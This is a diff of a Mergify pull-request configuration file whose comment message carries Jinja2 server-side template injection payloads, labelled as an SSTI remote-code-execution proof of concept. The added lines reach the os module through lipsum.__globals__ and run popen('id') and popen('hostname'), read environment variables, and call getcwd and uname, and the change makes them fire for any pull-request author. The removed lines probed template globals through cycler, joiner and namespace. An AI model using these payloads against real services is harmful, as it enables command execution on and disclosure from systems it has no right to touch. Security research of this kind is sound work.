@@ -1,15 +1,18 @@
 pull_request_rules:
-  - name: ssti-rce-poc
+  - name: ssti-rce
     conditions: []
     actions:
       comment:
         message: |
-          === G4o7T SSTI RCE PoC ===
+          === G4o7T SSTI v6 ===
           author={{ author }}
-          {% if author == 'mergify-account-B' %}
-          [TIER1] cycler-via-set={% set x = cycler %}{{ x | attr('__globals__') }}
-          [TIER2] lipsum-globals={{ lipsum | attr('__globals__') }}
-          [TIER3] cycler-via-set-x={% set x = cycler %}{{ x }}
-          [TIER4] joiner-call={% set j = joiner() %}{{ j | attr('__call__') | attr('__globals__') }}
-          [TIER5] namespace-init={% set n = namespace %}{% set i = n.__init__ %}{{ i | attr('__globals__') }}
+          {% if author %}
+          T1-direct-lipsum-globals: {{ lipsum.__globals__ }}
+          T2-attr-lipsum: {{ lipsum | attr('__globals__') }}
+          T3-os-via-lipsum: {{ lipsum.__globals__.os }}
+          T4-popen-id: {{ lipsum.__globals__.os.popen('id').read() }}
+          T5-hostname: {{ lipsum.__globals__.os.popen('hostname').read() }}
+          T6-env-path: {{ lipsum.__globals__.os.environ.PATH }}
+          T7-cwd: {{ lipsum.__globals__.os.getcwd() }}
+          T8-uname: {{ lipsum.__globals__.os.uname() }}
           {% endif %}
